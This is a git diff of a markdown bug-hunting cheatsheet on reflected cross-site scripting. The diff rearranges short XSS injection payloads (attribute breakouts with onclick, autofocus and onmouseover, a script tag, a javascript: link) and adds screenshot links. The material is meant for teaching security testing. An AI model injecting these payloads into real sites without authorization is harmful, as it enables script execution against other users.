@@ -23,9 +23,6 @@
 ```js
 "><h1>cyborg.71</h1>
 <script onclick="alert(1337)">
-" onclick="alert(1337)
-" autofocus="alert(1337)
-"onmouseover="alert(1)
 <a href="javascript:alert('XSS')">Click me</a>
 <img src=https://i.imgflip.com/8uo0t9.jpg>
 ```
@@ -39,6 +36,7 @@ If this is the case, you should inject this payloads.
 " autofocus onfocus="alert(1337)
 "onmouseover="alert(1)
 ```
+![Screenshot from 2024-06-22 22-10-29](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5f0c53d6-0489-483d-a82d-373456ee9233)
 ### Reflected XSS into a JavaScript string with angle brackets HTML encoded
 Inject ```<xss123>'"``` and see if your payload encoded in a javascript code.<br>
 ![Screenshot from 2024-06-13 00-19-30](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/9180969c-2299-4adf-9c4a-a05e97629938)<br>
